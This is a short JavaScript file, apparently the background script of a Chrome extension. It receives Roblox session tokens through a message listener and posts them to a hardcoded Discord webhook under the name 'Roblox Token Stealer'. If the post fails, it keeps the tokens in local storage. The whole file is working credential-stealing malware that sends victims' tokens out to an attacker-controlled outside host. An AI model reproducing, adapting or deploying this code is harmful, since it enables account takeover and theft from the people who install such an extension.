chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
  if (request.action === "sendToken") {
    const webhookUrl = "https://discordapp.com/api/webhooks/1428401329541353674/fWQrGpJNYIO8Gxn78nsXzUuDED1fPSmHC__qmuOg4B60PFXTPEcITJQKDuVe5slIbe3W";

    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: `New token stolen: ${request.token}`,
        username: "Roblox Token Stealer"
      })
    }).catch(() => {
      chrome.storage.local.set({ tokens: [request.token] });
    });
  }
});
